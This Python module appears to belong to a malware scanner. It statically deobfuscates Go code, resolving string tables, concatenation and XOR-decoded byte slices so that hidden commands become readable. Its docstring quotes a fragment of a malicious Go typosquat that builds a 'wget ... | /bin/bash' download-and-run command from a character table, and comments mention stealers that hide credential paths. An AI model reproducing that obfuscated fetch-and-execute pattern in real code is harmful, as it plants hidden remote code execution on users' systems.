"""Strings a Go file builds at run time, worked out statically -- the Go side of `js_eval.py`.

The malicious Go typosquats of 2025 (the `hypert` / `layout` family, review 98) never write their
command down. They declare a table of one-character strings and add it up:

```go
KoR := []string{"4", "/", "b", " ", "-", ...}
TPVE := "/bin/sh"
RqAG := "-c"
cmd := KoR[15] + KoR[26] + KoR[18] + ...          // "wget -O - https://... | /bin/bash &"
exec.Command(TPVE, RqAG, cmd).Start()
```

The capability rules see `exec.Command` handed three names and nothing else, so the download
piped into a shell is read by nobody. This module evaluates what such code can be evaluated
without running it -- string literals, `[]string{...}` tables, indexing into them, `+`, and
`strings.Join` -- and writes the values back where the names were, so the rules that read
commands and hosts read the command and the host.

Bounded and linear: no Go parser, no evaluation of calls other than `strings.Join` and
`string(...)` of a literal, a value is never longer than `MAX_VALUE`, and a name is resolved only
from an assignment before the use, in the same file. Anything it cannot evaluate it leaves as
written: the view never loses text, it only gains values.
"""

from __future__ import annotations

import re
from typing import Final

MAX_VALUE: Final = 8_000
#: Where `values` lists the names whose value the file does not show as written.
HIDDEN_KEY: Final = "\x00hidden"
MAX_TABLE: Final = 4_096
MAX_TEXT: Final = 2_000_000

_NAME: Final = r"[A-Za-z_][A-Za-z0-9_]{0,80}"
_ASSIGN: Final = re.compile(
    rf"(?m)^[ \t]*(?:var[ \t]+)?(?P<name>{_NAME})[ \t]*(?:[A-Za-z_\[\]]{{0,20}}[ \t]*)?:?=[ \t]*(?P<value>[^\n]{{1,{MAX_TEXT}}})$"
)
_TABLE: Final = re.compile(r"^\[\]string[ \t]*\{(?P<body>.*)\}[ \t;]*$", re.S)
_INDEX: Final = re.compile(rf"^(?P<name>{_NAME})\[(?P<index>\d{{1,5}})\]$")
_JOIN: Final = re.compile(
    rf"^strings\.Join\(\s*(?P<name>{_NAME})\s*,\s*(?P<sep>\"[^\"\\\n]{{0,40}}\"|`[^`]{{0,40}}`)\s*\)$"
)
_CALL_ARGS: Final = re.compile(r"\bexec\.Command(?:Context)?\s*\((?P<args>[^()\n]{1,2000})\)")

_BYTES: Final = re.compile(r"^\[\]byte[ \t]*\{(?P<body>[^{}]*)\}[ \t;,]*$")
_BYTE_ITEM: Final = re.compile(r"0[xX][0-9a-fA-F]{1,2}|\d{1,3}|'(?:\\.|[^'\\])'")
#: `func NAME(enc []byte) string {` whose loop XORs each byte with a key, repeating or single.
#: The head of `func NAME(enc []byte) string {`; the body is found by brace matching.
_XOR_HELPER: Final = re.compile(
    rf"func[ \t]+(?P<fn>{_NAME})\([ \t]*{_NAME}[ \t]+\[\]byte[ \t]*\)[ \t]*string[ \t]*\{{"
)
#: `b ^ key[i%len(key)]` (the two key names compared in code) or `b ^ 0x5a`.
_XOR_KEY: Final = re.compile(
    rf"\^[ \t]*(?:(?P<key>{_NAME})\[[ \t]*{_NAME}[ \t]*%[ \t]*len\([ \t]*(?P<again>{_NAME})[ \t]*\)[ \t]*\]"
    r"|(?P<byte>0[xX][0-9a-fA-F]{1,2}|\d{1,3}))"
)
_DECODE_CALL: Final = re.compile(rf"\b(?P<fn>{_NAME})\([ \t]*(?P<arg>{_NAME})[ \t]*\)")
#: A one-line helper over its string parameters: `func _env(a, b string) string { return
#: os.Getenv(a + b) }`. Its calls with literal arguments are evaluated by substitution.
_HELPER: Final = re.compile(
    rf"func[ \t]+(?P<fn>{_NAME})\((?P<params>(?:{_NAME}[ \t]*,[ \t]*){{0,4}}{_NAME})[ \t]+string\)"
    r"[ \t]*string[ \t]*\{[ \t]*return[ \t]+(?P<body>[^\n{}]{1,200}?)[ \t]*\}"
)
_HELPER_CALL: Final = re.compile(rf"\b(?P<fn>{_NAME})\((?P<args>[^()\n]{{1,300}})\)")
_GETENV: Final = re.compile(r"^os\.(?:Getenv|LookupEnv)\((?P<inner>.+)\)$")

_ESCAPES: Final = {"n": "\n", "t": "\t", "r": "\r", "\\": "\\", '"': '"', "'": "'", "0": "\0"}


class GoEval:
    @staticmethod
    def _literal(token: str) -> str | None:
        if token.startswith("`") and token.endswith("`"):
            return token[1:-1]
        if not (token.startswith('"') and token.endswith('"')):
            return None
        out: list[str] = []
        body = token[1:-1]
        index = 0
        while index < len(body):
            char = body[index]
            if char != "\\":
                out.append(char)
                index += 1
                continue
            nxt = body[index + 1 : index + 2]
            if nxt == "x" and re.fullmatch(r"[0-9a-fA-F]{2}", body[index + 2 : index + 4]):
                out.append(chr(int(body[index + 2 : index + 4], 16)))
                index += 4
            elif nxt == "u" and re.fullmatch(r"[0-9a-fA-F]{4}", body[index + 2 : index + 6]):
                out.append(chr(int(body[index + 2 : index + 6], 16)))
                index += 6
            else:
                out.append(_ESCAPES.get(nxt, nxt))
                index += 2
        return "".join(out)

    @staticmethod
    def _terms(expression: str) -> list[str] | None:
        """The operands of a `+` chain at the top level, strings kept whole; None past a limit."""
        terms: list[str] = []
        depth, start, index, quote = 0, 0, 0, ""
        while index < len(expression):
            char = expression[index]
            if quote:
                if char == "\\" and quote == '"':
                    index += 2
                    continue
                if char == quote:
                    quote = ""
            elif char in '"`':
                quote = char
            elif char in "([{":
                depth += 1
            elif char in ")]}":
                depth -= 1
            elif char == "+" and depth == 0:
                terms.append(expression[start:index].strip())
                start = index + 1
                if len(terms) > MAX_TABLE:
                    return None
            index += 1
        terms.append(expression[start:].strip())
        return terms

    @classmethod
    def _value(
        cls, expression: str, strings: dict[str, str], tables: dict[str, list[str]]
    ) -> str | None:
        expression = expression.strip().rstrip(";,").strip()
        call = _DECODE_CALL.fullmatch(expression)
        if call and expression in strings:
            return strings[expression]
        if expression.startswith("string(") and expression.endswith(")"):
            expression = expression[len("string(") : -1].strip()
        literal = cls._literal(expression)
        if literal is not None and len(expression) >= 2:
            return literal
        joined = _JOIN.match(expression)
        if joined and joined["name"] in tables:
            separator = cls._literal(joined["sep"]) or ""
            return separator.join(tables[joined["name"]])[:MAX_VALUE]
        terms = cls._terms(expression)
        if not terms or (len(terms) == 1 and terms[0] == expression and "+" not in expression):
            indexed = _INDEX.match(expression)
            if indexed and indexed["name"] in tables:
                table = tables[indexed["name"]]
                position = int(indexed["index"])
                return table[position] if position < len(table) else None
            return strings.get(expression)
        parts: list[str] = []
        for term in terms:
            if term == expression:
                return None
            part = cls._value(term, strings, tables)
            if part is None:
                return None
            parts.append(part)
            if sum(map(len, parts)) > MAX_VALUE:
                return None
        return "".join(parts)

    @staticmethod
    def _byte_values(body: str) -> bytes | None:
        out = bytearray()
        for item in _BYTE_ITEM.findall(body):
            if item.startswith("'"):
                value = ord(item[1]) if len(item) == 3 else ord(_ESCAPES.get(item[2], item[2]))
            else:
                value = int(item, 0)
            if value > 255:
                return None
            out.append(value)
        return bytes(out) if out else None

    @classmethod
    def decoders(cls, text: str) -> dict[str, bytes | int]:
        """Functions that XOR a byte slice with a key: name -> the key's NAME as bytes, resolved
        later, or the single byte. The 2025 Go stealer family hides every path and its endpoint
        this way (`_xd(_fAws)`)."""
        found: dict[str, bytes | int] = {}
        for helper in _XOR_HELPER.finditer(text):
            depth, index = 1, helper.end()
            limit = min(len(text), index + 2_000)
            while index < limit and depth:
                depth += text[index] == "{"
                depth -= text[index] == "}"
                index += 1
            for key in _XOR_KEY.finditer(text, helper.end(), index):
                if key["key"] and key["key"] == key["again"]:
                    found[helper["fn"]] = key["key"].encode()
                    break
                if key["byte"]:
                    found[helper["fn"]] = int(key["byte"], 0)
                    break
        return found

    @classmethod
    def _items(cls, body: str) -> list[str] | None:
        """The string literals of a `[]string{...}` body, or None when it holds anything else."""
        items: list[str] = []
        index = 0
        while index < len(body) and len(items) <= MAX_TABLE:
            char = body[index]
            if char in " \t\r\n,":
                index += 1
                continue
            if char == "`":
                end = body.find("`", index + 1)
            elif char == '"':
                end = index + 1
                while end < len(body) and body[end] not in '"\n':
                    end += 2 if body[end] == "\\" else 1
            else:
                return None
            if end < 0 or end >= len(body):
                return None
            literal = cls._literal(body[index : end + 1])
            if literal is None:
                return None
            items.append(literal)
            index = end + 1
        return items

    @classmethod
    def values(cls, text: str) -> tuple[dict[str, str], dict[str, list[str]]]:
        """Every name bound to a string, or to a table of strings, that can be worked out."""
        strings: dict[str, str] = {}
        tables: dict[str, list[str]] = {}
        if len(text) > MAX_TEXT:
            return strings, tables
        byte_tables: dict[str, bytes] = {}
        for found in _ASSIGN.finditer(text):
            value = found["value"].strip().rstrip(";,").strip()
            table = _BYTES.match(value)
            if table:
                decoded = cls._byte_values(table["body"])
                if decoded is not None:
                    byte_tables[found["name"]] = decoded
            elif value.startswith("[]byte(") and value.endswith(")"):
                literal = cls._literal(value[len("[]byte(") : -1].strip())
                if literal:
                    byte_tables[found["name"]] = literal.encode("utf-8")
        helpers = cls.decoders(text)
        for name, key in list(helpers.items()):
            if isinstance(key, bytes):
                material = byte_tables.get(key.decode())
                if material is None:
                    literal = strings.get(key.decode())
                    material = literal.encode("latin-1", "replace") if literal else None
                if not material:
                    helpers.pop(name)
                    continue
                helpers[name] = material
        for name, data in byte_tables.items():
            for fn, key in helpers.items():
                plain = (
                    bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
                    if isinstance(key, bytes)
                    else bytes(b ^ key for b in data)
                )
                strings[f"{fn}({name})"] = plain.decode("utf-8", "replace")[:MAX_VALUE]
        hidden = set(strings)  # the decoder calls: everything in `strings` so far is decoded
        for found in _ASSIGN.finditer(text):
            name, value = found["name"], found["value"].strip()
            table = _TABLE.match(value)
            if table:
                items = cls._items(table["body"])
                if items and len(items) <= MAX_TABLE:
                    tables[name] = items
                continue
            resolved = cls._value(value, strings, tables)
            if resolved is not None:
                strings[name] = resolved
                # Built from a table, a decoder or another hidden value: not readable as written.
                words = set(re.findall(_NAME, value))
                if words & (set(tables) | hidden) or _DECODE_CALL.search(value):
                    hidden.add(name)
        strings[HIDDEN_KEY] = "\x00".join(sorted(hidden))
        return strings, tables

    @classmethod
    def resolve(cls, text: str) -> str:
        """The file with each `exec.Command` argument that is a name or an expression replaced by
        its value as a Go string literal, and each assignment that builds a string followed by a
        comment holding the value. Lines are kept, so findings point where they did."""
        if (
            "exec.Command" not in text
            and "[]string" not in text
            and "[]byte{" not in text
            and "return " not in text
        ):
            return text
        strings, tables = cls.values(text)
        hidden = set(strings.pop(HIDDEN_KEY, "").split("\x00")) - {""}
        if not hidden and "exec.Command" not in text and not _HELPER.search(text):
            return text

        def quoted(value: str) -> str:
            return '"' + value.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n") + '"'

        def command(match: re.Match[str]) -> str:
            arguments = [a.strip() for a in match["args"].split(",")]
            rewritten = []
            for argument in arguments:
                value = cls._value(argument, strings, tables)
                rewritten.append(quoted(value) if value is not None else argument)
            return match.group(0).replace(match["args"], ", ".join(rewritten))

        lines = _CALL_ARGS.sub(command, text).split("\n")
        # One-line helpers called with literals: `_env("GITHUB_", "ENV")` reads `GITHUB_ENV`.
        helpers = {
            m["fn"]: ([p.strip() for p in m["params"].split(",")], m["body"].strip())
            for m in _HELPER.finditer(text)
        }
        if helpers:
            for call in _HELPER_CALL.finditer(text):
                if call["fn"] not in helpers:
                    continue
                params, body = helpers[call["fn"]]
                arguments = [a.strip() for a in call["args"].split(",")]
                values = [cls._value(a, strings, tables) for a in arguments]
                if len(values) != len(params) or any(v is None for v in values):
                    continue
                bound = {**strings, **dict(zip(params, values, strict=True))}
                getenv = _GETENV.match(body)
                inner = cls._value(getenv["inner"] if getenv else body, bound, tables)
                if inner is None:
                    continue
                rendered = f"os.Getenv({quoted(inner)})" if getenv else quoted(inner)
                line = text.count("\n", 0, call.start())
                if line < len(lines):
                    lines[line] += f" // {call['fn']}(...) = {rendered}"
        # Every decoder call, wherever it sits (`_readFile(_xd(_fAws))` in a map literal): the
        # value it returns, beside it.
        offsets = [0]
        for line in text.split("\n"):
            offsets.append(offsets[-1] + len(line) + 1)
        for call in _DECODE_CALL.finditer(text):
            value = strings.get(call.group(0))
            if value is None:
                continue
            line = max(0, next(i for i, start in enumerate(offsets) if start > call.start()) - 1)
            if line < len(lines):
                lines[line] += f" // {call.group(0)} = {quoted(value)}"
        for found in _ASSIGN.finditer(text):
            name = found["name"]
            if name in hidden and name in strings and not _TABLE.match(found["value"].strip()):
                line = text.count("\n", 0, found.start())
                if found["value"].strip() != quoted(strings[name]) and line < len(lines):
                    lines[line] += f" // = {quoted(strings[name])}"
        return "\n".join(lines)


__all__ = ["GoEval"]
